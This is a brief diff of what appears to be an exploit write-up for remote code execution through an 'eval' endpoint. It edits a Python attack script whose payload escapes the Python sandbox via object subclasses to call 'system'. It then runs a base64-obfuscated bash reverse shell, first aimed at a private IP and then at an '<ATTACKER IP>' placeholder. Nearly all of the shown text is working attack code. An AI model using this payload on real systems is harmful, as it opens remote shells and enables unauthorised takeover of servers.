@@ -78,7 +78,7 @@ RCE via the `eval` function.
     from ecdsa import VerifyingKey, SigningKey, NIST384p
     url = 'http://127.0.0.1:81/eval'
     uniq_vals = open("uniq.txt").readlines()
-    expr = "[].__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__['system']('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzEyMzQgMD4mMQ== | base64 -d | bash')"
+    expr = "[].__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__['system']('echo YmFzaCAtaSA+JiAvZGV2L3RjcC88QVRUQUNLRVIgSVA+LzEyMzQgMD4mMQ== | base64 -d | bash')"
     
     def sign(msg, sk):
     	return binascii.hexlify(sk.sign(msg))
